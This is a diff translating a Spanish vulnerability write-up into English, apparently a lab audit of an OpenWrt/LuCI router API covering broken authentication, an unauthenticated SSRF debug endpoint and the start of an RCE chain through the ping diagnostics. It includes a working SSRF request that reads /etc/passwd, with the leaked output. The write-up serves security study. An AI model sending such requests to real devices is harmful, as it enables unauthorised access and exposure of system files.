@@ -3,11 +3,11 @@ In this section we are analyzing the vulnerabilities present in the internal API
 
 # API2:2023 Broken Authentication
 
-En el mecanismo de autenticación de nuestra API para administrar el router se detectan algunas características principales propias de una _autenticación inadecuada._
+The authentication mechanism of our API for managing the router detects some key characteristics typical of *inadequate authentication*.
 
-## 1. Gestión de sesiones vulnerable
+## 1. Vulnerable session management
 
-En la función de creación de una sesión, no existe ningún *rate limiting* ni protección contra ataques de fuerza bruta:
+In the session creation function, there is no rate limiting or protection against brute force attacks:
 ```lua
 local function session_setup(user, pass, allowed_users)
 
@@ -24,7 +24,7 @@ local function session_setup(user, pass, allowed_users)
 		})
 ```
 
-## 2. Generación de token débil
+## 2. Weak token generation
 ```lua
 util.ubus("session", "set", {
 
@@ -34,9 +34,9 @@ util.ubus("session", "set", {
 })
 ```
 
-## 3. Validación insuficiente
+## 3. Insufficient validation
 
-No existe validación del origen del token CSRF.
+There is no validation of the origin of the CSRF token.
 
 ```lua
 function test_post_security()
@@ -57,7 +57,7 @@ function test_post_security()
 end
 ```
 
-Como tampoco se verifica bien la sesión que se va a devolver:
+The session to be returned is also not properly verified:
 ```lua
 local function session_retrieve(sid, allowed_users)
 
@@ -78,12 +78,11 @@ local function session_retrieve(sid, allowed_users)
 end
 ```
 
-No se verifica la dirección IP de origen, tampoco la fecha de expiración del token, ni tampoco la consistencia del User-Agent.
+The source IP address is not verified, nor is the token expiration date or the consistency of the User-Agent.
 
-## Falta de validación de contraseña actual
+## Lack of current password validation
 
-El código permite cambiar la contraseña del administrador **sin verificar la contraseña actual.** Confía en la autenticación plenamente previa que se ha hecho para llegar al panel de administración.
-
+The code allows the administrator password to be changed **without verifying the current password.** It relies entirely on the authentication that has already been performed to access the administration panel.
 ```lua
 function m.parse(map)
     local v1 = pw1:formvalue("_pass")
@@ -108,7 +107,7 @@ end
 
 # API7:2023 Server Side Request Forgery
 
-El desarrollador dejó un archivo para hacer *debugging* y poder probar la conexión a diferentes puntos del sistema para ver si las evaluaciones de URL's y conexiones dentro de la misma red funcionaban. Para ello usó una ruta alternativa y fuera del path del nodo padre *dispatch.lua* por lo que no es necesario autenticarse para usar este *endpoint*.
+The developer left a file for debugging and testing the connection to different points in the system to see if URL evaluations and connections within the same network were working. To do this, they used an alternative route outside the path of the parent node `dispatch.lua`, so authentication is not required to use this endpoint.
 
 ```lua
 function index()
@@ -138,21 +137,22 @@ function index()
 end
 ```
 
-Además, si listamos las herramientas y paquetes instalados, se puede ver que en la fase de desarrollo se dejó instalado *curl*, seguramente para llevar a cabo estas pruebas.
+Furthermore, if we list the installed tools and packages, we can see that *curl* was left installed during the development phase, most likely to carry out these tests.
 
-Haciendo uso de esta entrada podemos ver que el servidor recibe las peticiones y reporta resultados:
+Using this entry, we can see that the server receives requests and reports results:
 
 ```shell
 ❯ curl -X GET "http://192.168.1.1/cgi-bin/luci/api/v1/check?url=file:///etc/passwd"
 {"vulnerability":"SSRF_WITHOUT_AUTH","requester":"192.168.1.2","timestamp":1750736334,"status":"success","url":"file:\/\/\/etc\/passwd","headers":[],"response":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0root:x:0:0:root:\/root:\/bin\/ash\nntp:x:123:123:ntp:\/var\/run\/ntp:\/bin\/false\ndnsmasq:x:453:453:dnsmasq:\/var\/run\/dnsmasq:\/bin\/false\nlogd:x:514:514:logd:\/var\/run\/logd:\/bin\/false\nubus:x:81:81:ubus:\/var\/run\/ubus:\/bin\/false\nnetwork:x:101:101:network:\/var\/run\/network:\/bin\/false\nopenwrtuser:x:1000:1000:root:\/root:\/bin\/ash\nanonymous:x:1001:1001::\/tmp\/ftp:\/bin\/ash\nnobody:x:1002:1002::\/var:\/bin\/false\n\r100   390  100   390    0     0   455k      0 --:--:-- --:--:-- --:--:--  380k\n"}%
 ```
 
-### RCE en Diagnostics
+In this case, it is reported that the user has successfully discovered the vulnerability.
+### RCE in Diagnostics
 
-En la sección *Network* existe una entrada llamada *Diagnostics* la cual permite realizar ciertas ejecuciones de comandos: *ping, traceroute, nslookup.* Si analizamos el código que se encarga de estas funcionalidades nos damos cuenta de que tiene un problema:
-
+In the *Network* section, there is an entry called *Diagnostics* that allows certain commands to be executed: *ping, traceroute, nslookup.* If we analyze the code responsible for these functionalities, we realize that it has a problem:
 ```lua
 138: page = entry({"admin", "network", "diag_ping"}, call("diag_ping"), nil)
 ```
 
-En el archivo *network.lua*, que es donde se encuentran las distintas funcionalidades, vemos que la llamada a la función *diag_ping* que se encarga de ejecutar el comando usa *call()*, el cual permite tanto peticiones POST como GET. Si hiciesemos analizamos un paquete enviado al servidor usando este servicio vemos que podemos obviar ciertos campos de autenticación básicos. Aún así, necesitamos la cookie *syauth* para que se nos permita hacer uso de esta función. Es aquí donde entra el uso del **SSRF** previamente descubierto. Si hacemos una petición al enpoint del *ping* haciendo uso del propio servidor vemos lo siguiente:
+In the *network.lua* file, which is where the different functionalities are located, we see that the call to the *diag_ping* function that executes the command uses *call()*, which allows both POST and GET requests. If we analyze a packet sent to the server using this service, we see that we can bypass certain basic authentication fields. Even so, we need the *syauth* cookie to be allowed to use this function. This is where the previously discovered **SSRF** comes into play. If we make a request to the *ping* endpoint using the server itself, we see the following:
+
